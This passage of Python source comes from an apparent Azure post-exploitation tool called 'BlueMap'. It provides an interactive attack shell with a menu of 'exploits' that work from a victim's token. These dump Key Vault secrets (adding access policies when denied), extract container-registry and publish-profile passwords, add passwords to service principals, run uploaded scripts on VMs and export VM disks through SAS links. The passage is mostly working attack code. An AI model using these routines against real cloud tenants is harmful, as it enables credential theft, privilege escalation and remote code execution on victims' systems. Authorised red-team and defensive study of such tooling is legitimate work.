    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", Token)
    return r['json']

def attackWindow():
    banner = '''
    ######                       #     #               
#     # #      #    # ###### ##   ##   ##   #####  
#     # #      #    # #      # # # #  #  #  #    # 
######  #      #    # #####  #  #  # #    # #    # 
#     # #      #    # #      #     # ###### #####  
#     # #      #    # #      #     # #    # #      
######  ######  ####  ###### #     # #    # #    
'''
    '''
    print(banner)
    '''
    supportedCommands = [
        "test",
        "whoami",
        "scopes",
        "get_subs",
        "set_target",
        "get_target",
        "get_resources",
        "get_res",
        "sts",
        "subs",
        "iam_scan",
        "privs",
        "perms",
        "exploits",
        "showtoken",
        "deltoken",
        "run",
        "use",
        "exit",
        "back"
    ]
    exploits = [
        "Token/GenToken",
        "Token/SetToken",
        "Reader/ListAllUsers",
        "Reader/ExposedAppServiceApps",
        "Reader/ListAllAzureContainerRegistry",
        "Reader/ListAutomationAccounts",
        "Reader/DumpAllRunBooks",
        "Reader/ListAllRunBooks",
        "Reader/ListAllVaults",
        "Reader/ListAppServiceSites",
        "Reader/ListVirtualMachines",
        "Reader/ListAllStorageAccounts",
        "Reader/ARMTemplatesDisclosure",
        "Reader/ListServicePrincipal",
        "Reader/abuseServicePrincipals",
        "Contributor/ListACRCredentials",
        "Contributor/ReadVaultSecret",
        "Contributor/RunCommandVM",
        "Contributor/VMExtensionResetPwd",
        "Contributor/VMExtensionExecution",
        "Contributor/VMDiskExport",
        "Contributor/DumpWebAppPublishProfile",
        "GlobalAdministrator/elevateAccess"
    ]
    while (True):
        global TargetSubscription
        global TotalTargets
        global Token
        global ExploitChoosen

        if ExploitChoosen is not None:
            mode = input("$ exploit(" + ExploitChoosen + ") >> ")
        else:
            mode = input("$ bluemap >> ")

        checkCmdInital = mode.split(" ")
        if checkCmdInital[0] not in supportedCommands:
            print("Not supported command. Supported commands: " + str(supportedCommands))
        else:
            if mode == "whoami":
                currentProfile()
            elif mode == "test":
                x = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
                print(dict(x['headers'])['Content-Type'])
            elif mode == "scopes":
                currentScope()
            elif mode == "get_subs" or mode == "subs":
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    rows = []
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        rows.append(
                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
                             "displayName": subRecord['displayName'], "State": subRecord['state'],
                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
                        )
                        subRecordCount += 1
                        TotalTargets.append(subRecord['subscriptionId'])
                    print(make_table(field_names, rows))
            elif "set_target" in mode or "sts" in mode:
                argSub = mode.split(" ")
                if len(argSub) < 2:
                    print("No subscription has been selected.")
                else:
                    if argSub[1] not in TotalTargets:
                        print("Invalid target subscription.")
                    else:
                        print("Set to target SubscriptionId " + argSub[1])
                        TargetSubscription = argSub[1]
            elif "get_target" in mode:
                print("Current Target SubscriptionId = " + str(TargetSubscription))
            elif "iam_scan" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                    allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                    rows = []
                    allRolesAssignsRecordsCount = 0
                    for role in range(0, len(allRolesAssigns)):
                        resultAllRolesAssigns = allRolesAssigns
                        currentRoleInformation = GetAllRoleDefinitionsUnderId(
                            resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                        currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                        currentRoleName = currentRoleInformation['properties']['roleName']
                        if canRoleBeAbused(currentRoleName) is not False:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "Yes",
                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
                            )
                        else:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "No",
                                 "Details": "N/A"}
                            )
                        allRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
                    print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names2 = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                    rows2 = []
                    allPermRolesAssignsRecordsCount = 0
                    for rolePermission in range(0, len(allPermRolesAssigns)):
                        resultAllRolesAssigns = allPermRolesAssigns
                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                            resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                        currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                        currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                        for permission in currentRolePermissions:
                            if canPermissionBeAbused(permission) is not False:
                                rows2.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "Yes",
                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
                                )
                            else:
                                rows2.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "No",
                                     "Details": "N/A"}
                                )
                            allPermRolesAssignsRecordsCount += 1
                    print(make_table(field_names2, rows2))
            elif "privs" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                    allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                    rows = []
                    allRolesAssignsRecordsCount = 0
                    for role in range(0, len(allRolesAssigns)):
                        resultAllRolesAssigns = allRolesAssigns
                        currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                        currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                        currentRoleName = currentRoleInformation['properties']['roleName']
                        if canRoleBeAbused(currentRoleName) is not False:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "Yes",
                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
                            )
                        else:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "No",
                                 "Details": "N/A"}
                            )
                        allRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "perms" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                    rows = []
                    allPermRolesAssignsRecordsCount = 0
                    for rolePermission in range(0, len(allPermRolesAssigns)):
                        resultAllRolesAssigns = allPermRolesAssigns
                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                        resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                        currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                        currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                        for permission in currentRolePermissions:
                            if canPermissionBeAbused(permission) is not False:
                                rows.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "Yes",
                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
                                )
                            else:
                                rows.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "No",
                                     "Details": "N/A"}
                                )
                            allPermRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "get_resources" in mode or "get_res" in mode:
                if TargetSubscription == None:
                    print("Please set target subscription.")
                else:
                    print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
                    resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
                    resultsInternalRes = resultResources['value']
                    field_names = ["#", "Resource Name", "Type", "Location"]
                    rows = []
                    subResRecordCount = 0
                    for objRes in range(0, len(resultsInternalRes)):
                        resultResources = resultsInternalRes
                        subResRecordCount += 1
                        rows.append(
                            {"#": subResRecordCount, "Resource Name": resultResources[objRes]['name'],
                             "Type": resultResources[objRes]['type'], "Location": resultResources[objRes]['location']}
                        )
                    print(make_table(field_names, rows))
            elif mode == "exploits":
                field_names = ["#", "Name"]
                rows = []
                exploitCount = 0
                for exploit in exploits:
                    rows.append(
                        {"#": exploitCount, "Name": exploit}
                    )
                    exploitCount += 1
                print(make_table(field_names, rows))
            elif "use" in mode:
                argExpSub = mode.replace("use ", "").replace(" ", "")
                if argExpSub == "use":
                    print("please choose an exploit")
                else:
                    checkExploitInital = mode.split("use ")
                    if checkExploitInital[1] not in exploits:
                        print("Not supported exploit. Supported exploits: " + str(exploits))
                    else:
                        if hasTokenInPlace():
                            ExploitChoosen = argExpSub
                        else:
                            if "Token/" in checkExploitInital[1]:
                                ExploitChoosen = argExpSub
                            else:
                                print("Please set target victim access token. Use Token/* exploits.")
            elif mode == "back" or mode == "exit":
                if ExploitChoosen is not None:
                    ExploitChoosen = None
                else:
                    exit
            elif mode == "showtoken":
                print(getToken())
            elif mode == "deltoken":
                print("Resetting token..")
                setToken("")
            elif "Token/GenToken" in ExploitChoosen and mode == "run":
                print("Trying getting token automatically for you...")
                token = tryGetToken()
                if token:
                    initToken(token, False)
            elif "Token/SetToken" in ExploitChoosen and mode == "run":
                print("Please paste your Azure token here:")
                token = input("Enter Token:")
                initToken(token, True)
                print("All set.")
            elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all external-facing Azure Service Apps..")
                if len(RD_ListExposedWebApps()) < 1:
                    print("No Azure Service Apps were found.")
                else:
                    field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)","Identity"]
                    rows = []
                    AppServiceRecordsCount = 0
                    for AppServiceRecord in RD_ListExposedWebApps():
                        if AppServiceRecord['identity'] == "N/A":
                            AppIdentity = "N/A"
                        else:
                            AppIdentity = AppServiceRecord['identity']['type']
                        rows.append(
                            {"#": AppServiceRecordsCount, "App Name": AppServiceRecord['name'],
                             "Type": AppServiceRecord['kind'], "Status": AppServiceRecord['properties']['state'],
                             "Enabled Hostname(s)": str(AppServiceRecord['properties']['enabledHostNames']),
                             "Identity": AppIdentity}
                        )
                        AppServiceRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAllAzureContainerRegistry" in ExploitChoosen and mode == "run":
                print("Trying to list all ACR (Azure Container Registry) available in all subscriptions..")
                if len(RD_ListAllACRs()['value']) < 1:
                    print("No Azure Container Registry were found.")
                else:
                    field_names = ["#", "Registry Name", "Location", "Login Server", "AdminEnabled", "CreatedAt"]
                    rows = []
                    ACRRecordsCount = 0
                    for ACRRecord in RD_ListAllACRs()['value']:
                        rows.append(
                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
                             "Location": ACRRecord['location'], "Login Server": ACRRecord['properties']['loginServer'],
                             "AdminEnabled": ACRRecord['properties']['adminUserEnabled'],
                             "CreatedAt": ACRRecord['properties']['loginServer']}
                        )
                        ACRRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/ListACRCredentials" in ExploitChoosen and mode == "run":
                print("Trying to list all users and passwords for ACR (Azure Container Registry)..")
                if len(RD_ListAllACRs()['value']) < 1:
                    print("No Azure Container Registry were found.")
                else:
                    field_names = ["#", "Registry Name", "UserName", "Password(s)"]
                    rows = []
                    ACRRecordsCount = 0
                    for ACRRecord in RD_ListAllACRs()['value']:
                        InfoACR = HLP_GetACRCreds(ACRRecord['id'])
                        rows.append(
                            {"#": ACRRecordsCount, "Registry Name": ACRRecord['name'],
                             "UserName": InfoACR["username"],
                             "Password(s)": str(InfoACR["passwords"])
                             }
                        )
                        ACRRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAutomationAccounts" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all automation accounts..")
                if len(RD_ListAutomationAccounts()) < 1:
                    print("No Automation accounts were found.")
                else:
                    field_names = ["#", "SubscriptionId", "AccountName", "Location", "Tags"]
                    rows = []
                    AutomationAccountRecordsCount = 0
                    for AutomationAccRecord in RD_ListAutomationAccounts():
                        rows.append(
                            {"#": AutomationAccountRecordsCount, "SubscriptionId": AutomationAccRecord['subscriptionId'],
                             "AccountName": AutomationAccRecord["name"],
                             "Location": AutomationAccRecord["location"],
                             "Tags": str(AutomationAccRecord['tags']),
                             }
                        )
                        AutomationAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/ReadVaultSecret" in ExploitChoosen and mode == "run":
                if not hasVaultEnabled:
                    print("ERROR: No Vault Scope Enabled.")
                else:
                    if len(RD_ListAllVaults()) < 1:
                        print("No Vaults were found.")
                    else:
                        print("Trying to list all vaults.. (it might take a few minutes)")
                        field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
                        rows = []
                        victims = []
                        vaultRecordCount = 0
                        for VaultRecord in RD_ListAllVaults():
                            victims.append({"name": VaultRecord['name'], "id": VaultRecord['id']})
                            rows.append(
                                {"#": vaultRecordCount, "Name": VaultRecord['name'],
                                 "Location": VaultRecord['location'], "Type": VaultRecord['type'],
                                 "Resource Group": VaultRecord['resourceGroup'],
                                 "SubscriptionId": VaultRecord['subscriptionId']}
                            )
                            vaultRecordCount += 1
                        print(make_table(field_names, rows))
                        TargetVault = input("Select Vault Id [i.e. 0]: ")
                        Selection = int(TargetVault)
                        secretsLoad = HLP_GetSecretsInVault(victims[Selection]['name']).split("|")

                        field_names2 = ["#", "Secret Name", "Secret Value"]
                        rows2 = []
                        vaultSecretRecordCount = 0
                        SecretPathPattren = "https://"+str(victims[Selection]['name'])+".vault.azure.net/secrets/"
                        print("Trying enumerate all "+str(victims[Selection]['name'])+" vault secrets.. ")
                        if 'does not have secrets list permission on key vault' in secretsLoad[1]:
                            print("User does not have secrets list permission. Trying adding access policy.. ")
                            if HLP_AddVaultACL(victims[Selection]['id']):
                                secretsLoadAgain = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                                for secret in secretsLoadAgain:
                                    rows2.append(
                                        {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren,""),
                                        "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
                                    )
                                    vaultSecretRecordCount += 1
                            else:
                                print("Failed to create access policy for vault.")
                        else:
                            secretsLoadClean = HLP_GetSecretsInVaultNoStrings(victims[Selection]['name'])
                            for secret in secretsLoadClean:
                                rows2.append(
                                    {"#": vaultSecretRecordCount, "Secret Name": secret['id'].replace(SecretPathPattren, ""),
                                     "Secret Value": HLP_GetSecretValueTXT(secret['id'])}
                                )
                                vaultSecretRecordCount += 1
                        print(make_table(field_names2, rows2))
            elif "Reader/DumpAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                print("Keep in mind that it might be noisy opsec..")
                if len(RD_ListRunBooksByAutomationAccounts()) < 1:
                    print("No Runbooks were found.")
                else:
                    ExportedRunBooksRecordsCount = 0
                    DestPath = input("Please enter the path for store the data locally [i.e. C:\\tmp]: ")
                    for CurrentRunBookRecord in RD_ListRunBooksByAutomationAccounts():
                        with open(os.path.normpath(DestPath+'\\'+'runbook_'+str(CurrentRunBookRecord['name'])+'.txt'), 'x') as f:
                            f.write(str(RD_DumpRunBookContent(CurrentRunBookRecord['id'])))
                        ExportedRunBooksRecordsCount += 1
                    print("Done. Dumped Total " + str(ExportedRunBooksRecordsCount) + " runbooks to " + str(DestPath))
            elif "Reader/ListAllRunBooks" in ExploitChoosen and mode == "run":
                print("Trying to dump runbooks codes under available automation accounts (it may takes a few minutes)..")
                print("Keep in mind that it might be noisy opsec..")
                if len(RD_ListRunBooksByAutomationAccounts()) < 1:
                    print("No Runbooks were found.")
                else:
                    print("Trying to enumerate all runbooks under available automation accounts..")
                    field_names = ["#", "SubscriptionId", "AutomationAccount", "Runbook Name", "Runbook Type", "Status", "CreatedAt", "UpdatedAt"]
                    rows = []
                    AutomationAccountRecordsCount = 0
                    for RunBookRecord in RD_ListRunBooksByAutomationAccounts():
                        rows.append(
                            {"#": AutomationAccountRecordsCount,
                             "SubscriptionId": RunBookRecord['subscriptionId'],
                             "AutomationAccount": RunBookRecord["automationAccount"],
                             "Runbook Name": RunBookRecord["name"],
                             "Runbook Type": RunBookRecord['properties']['runbookType'],
                             "Status": RunBookRecord['properties']['state'],
                             "CreatedAt": RunBookRecord['properties']['creationTime'],
                             "UpdatedAt": RunBookRecord['properties']['lastModifiedTime'],
                             }
                        )
                        AutomationAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
                print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
                if len(RD_ListARMTemplates()) < 1:
                    print("No ARM Templates were found.")
                else:
                    print("Skipping SecureString/Object/Array values from list..")
                    field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
                    rows = []
                    armRecordCount = 0
                    for ArmTempRecord in RD_ListARMTemplates():
                        for itStr in ArmTempRecord['params']:
                            if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
                                continue
                            rows.append({
                                 "#": armRecordCount,
                                 "Deployment Name": ArmTempRecord['name'],
                                 "Parameter Name": itStr,
                                 "Type": ArmTempRecord['params'][itStr]['type'],
                                 "Parameter Value": ArmTempRecord['params'][itStr]['value']
                            })
                        for itStrO in ArmTempRecord['outputs']:
                            rows.append({
                                "#": armRecordCount,
                                "Deployment Name": ArmTempRecord['name'],
                                "Parameter Name": itStrO,
                                "Type": ArmTempRecord['outputs'][itStrO]['type'],
                                "Parameter Value": ArmTempRecord['outputs'][itStrO]['value']
                            })
                        armRecordCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                print("Trying to list all users.. (it might take a few minutes)")
                field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
                rows = []
                AllUsersRecordsCount = 0
                for UserRecord in RD_ListAllUsers()['value']:
                    rows.append(
                        {"#": AllUsersRecordsCount,
                         "DisplayName": UserRecord['displayName'],
                         "First": UserRecord['givenName'],
                         "Last": UserRecord['surname'],
                         "mobilePhone": UserRecord['mobilePhone'],
                         "mail": UserRecord['mail'],
                         "userPrincipalName": UserRecord['userPrincipalName']
                         }
                    )
                    AllUsersRecordsCount += 1
                print(make_table(field_names, rows))
            elif "Reader/ListAllStorageAccounts" in ExploitChoosen and mode == "run":
                print("Trying to list all storage accounts.. (it might take a few minutes)")
                if len(RD_ListAllStorageAccounts()) < 1:
                    print("No Storage Accounts were found.")
                else:
                    field_names = ["#", "Name", "Location", "Type", "CustomDomain", "AllowBlobPublicAccess", "AllowSharedKeyAccess", "Resource Group"]
                    rows = []
                    AllStorageAccountRecordsCount = 0
                    for SARecord in RD_ListAllStorageAccounts():
                        rows.append(
                            {"#": AllStorageAccountRecordsCount,
                             "Name":  SARecord['name'],
                             "Location": SARecord['location'],
                             "Type": SARecord['type'],
                             "CustomDomain": SARecord['customDomain'],
                             "AllowBlobPublicAccess": SARecord['properties']['allowBlobPublicAccess'],
                             "AllowSharedKeyAccess": SARecord['allowSharedKeyAccess'],
                             "Resource Group": SARecord['resourceGroup']
                             }
                        )
                        AllStorageAccountRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAllVaults" in ExploitChoosen and mode == "run":
                print("Trying to list all vaults.. (it might take a few minutes)")
                if len(RD_ListAllVaults()) < 1:
                    print("No Vaults were found.")
                else:
                    field_names = ["#", "Name", "Location", "Type", "Resource Group", "SubscriptionId"]
                    rows = []
                    vaultRecordCount = 0
                    for VaultRecord in RD_ListAllVaults():
                        rows.append(
                            {"#": vaultRecordCount, "Name": VaultRecord['name'],
                             "Location": VaultRecord['location'], "Type": VaultRecord['type'],
                             "Resource Group": VaultRecord['resourceGroup'],
                             "SubscriptionId": VaultRecord['subscriptionId']}
                        )
                        vaultRecordCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListVirtualMachines" in ExploitChoosen and mode == "run":
                print("Trying to list all virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    field_names = ["#", "Name", "Location", "PublicIP", "ResourceGroup", "Identity", "SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        if UserVMRecord['identity'] == "N/A":
                            VMIdentity = "N/A"
                        else:
                            VMIdentity = UserVMRecord['identity']['type']
                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": "N/A",
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "Identity": VMIdentity,
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                        else:
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],
                                                                 UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "Identity": VMIdentity,
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                        AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all service principles (App registrations)..")
                if len(RD_AddAppSecret()) < 1:
                    print("No Apps registrations were found.")
                else:
                    field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
                    rows = []
                    EntAppsRecordsCount = 0
                    for EntAppsRecord in RD_AddAppSecret()['value']:
                        rows.append(
                            {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                             "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                             "Has Ownership?": CHK_AppRegOwner(EntAppsRecord['appId'])}
                        )
                        EntAppsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
                print("Trying to enumerate all Enterprise applications (service principals)..")
                if len(RD_AddAppSecret()) < 1:
                    print("No service principals were found.")
                else:
                    field_names = ["#", "App Name", "AppId", "Domain", "Can Abused?"]
                    rows = []
                    EntAppsRecordsCount = 0
                    for EntAppsRecord in RD_AddAppSecret()['value']:
                        print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
                        pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
                        if pwdGen == "N/A":
                            rows.append(
                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                                 "Can Abused?": "N/A"})
                        else:
                            rows.append(
                                {"#": EntAppsRecordsCount, "App Name": EntAppsRecord['displayName'],
                                 "AppId": EntAppsRecord['appId'], "Domain": EntAppsRecord['publisherDomain'],
                                 "Can Abused?": pwdGen})
                        EntAppsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Contributor/DumpWebAppPublishProfile" in ExploitChoosen and mode == "run":
                print("Trying to enumerate app service sites.. (it might take a few minutes)")
                if len(RD_ListAllDeployments()) < 1:
                    print("No deployments were found.")
                else:
                    field_names = ["#", "ProfileName", "User", "Password", "Host"]
                    rows = []
                    AllDepolymentsRecordsCount = 0
                    for DeploymentRecord in RD_ListAllDeployments():
                        print("Enumerate strings for site " + DeploymentRecord['name'] + " ...")
                        DataStrings = CON_GetPublishProfileBySite(DeploymentRecord['id'])
                        if "Failed to parse deployment template" in DataStrings:
                            print(DataStrings)
                            continue
                        else:
                            for data in DataStrings:
                                rows.append(
                                    {"#": AllDepolymentsRecordsCount, "ProfileName": data['name'],
                                     "User": DeploymentRecord['user'], "Password": DeploymentRecord['pwd'],
                                     "Host": DeploymentRecord['host']}
                                )
                            AllDepolymentsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "Reader/ListAppServiceSites" in ExploitChoosen and mode == "run":
                print("Trying to enumerate app service sites.. (it might take a few minutes)")
                if len(RD_ListAllDeployments()) < 1:
                    print("No deployments were found.")
                else:
                    field_names = ["#", "SiteName", "Location", "Type", "Status"]
                    rows = []
                    AllDepolymentsRecords = 0
                    for DeploymentRecord in RD_ListAllDeployments():
                        rows.append(
                            {"#": AllDepolymentsRecords, "SiteName": DeploymentRecord['name'],
                             "Location": DeploymentRecord['location'], "Type": DeploymentRecord['type'],
                             "Status": DeploymentRecord['properties']['state']}
                        )
                        AllDepolymentsRecords += 1
                    print(make_table(field_names, rows))
            elif "Contributor/RunCommandVM" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "OSType", "Identity", "ResourceGroup","SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        if UserVMRecord['identity'] == "N/A":
                            VMIdentity = "N/A"
                        else:
                            VMIdentity = UserVMRecord['identity']['type']
                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                            continue
                        else:
                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'],
                                                          "os": UserVMRecord['properties']['storageProfile']['osDisk']['osType'], "location": UserVMRecord['location'],
                                                          "subId": UserVMRecord['subscriptionId'],
                                                          "rg": UserVMRecord['resourceGroup']}
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "PublicIP": HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'], UserVMRecord['name']),
                                 "OSType": UserVMRecord['properties']['storageProfile']['osDisk']['osType'],
                                 "ResourceGroup": UserVMRecord['resourceGroup'],
                                 "Identity": VMIdentity,
                                 "SubscriptionId": UserVMRecord['subscriptionId']
                                 }
                            )
                        AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
                    TargetVM = input("Select Target VM Name [i.e. 1]: ")
                    Selection = int(TargetVM)
                    CmdVMPath = input("Enter Path for Script [i.e. C:\exploit\shell.ps1]: ")
                    with open(os.path.normpath(CmdVMPath)) as f:
                        CmdFileContent = f.read()
                    print(CON_VMRunCommand(victims[Selection]["subId"],victims[Selection]["rg"],victims[Selection]["os"],victims[Selection]["name"], CmdFileContent))
            elif "Contributor/VMDiskExport" in ExploitChoosen and mode == "run":
                print("Trying to list deallocated virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "DiskName", "VM Status"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                            VMState = HLP_GetVMInstanceView(UserVMRecord['subscriptionId'],UserVMRecord['resourceGroup'],UserVMRecord['name'])
                            if VMState != "PowerState/deallocated":
                                continue
                            victims[AllVMRecordsCount] = {"name": UserVMRecord['name'], "location": UserVMRecord['location'], "diskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],"subId": UserVMRecord['subscriptionId'],"rg": UserVMRecord['resourceGroup']}
                            rows.append(
                                {"#": AllVMRecordsCount,
                                 "Name": UserVMRecord['name'],
                                 "Location": UserVMRecord['location'],
                                 "DiskName": UserVMRecord['properties']['storageProfile']['osDisk']['name'],
                                 "VM Status": VMState
                                 }
                            )
                            AllVMRecordsCount += 1
                    print(make_table(field_names, rows))
                    TargetVM = input("Select Target DiskVM [i.e. 1]: ")
                    print("Create a SAS link for VHD download...")
                    Selection = int(TargetVM)
                    print(CON_GenerateVMDiskSAS(victims[Selection]["subId"], victims[Selection]["rg"], victims[Selection]["diskName"]))
            elif "Contributor/VMExtensionExecution" in ExploitChoosen and mode == "run":
                print("Trying to list exposed virtual machines.. (it might take a few minutes)")
                if len(RD_ListAllVMs()) < 1:
                    print("No VMs were found.")
                else:
                    victims = {}
                    field_names = ["#", "Name", "Location", "PublicIP", "adminUsername", "ResourceGroup",
                                                "SubscriptionId"]
                    rows = []
                    AllVMRecordsCount = 0
                    for UserVMRecord in RD_ListAllVMs():
                        if HLP_GetAzVMPublicIP(UserVMRecord['subscriptionId'], UserVMRecord['resourceGroup'],UserVMRecord['name']) == "N/A":
                            continue
                        else:
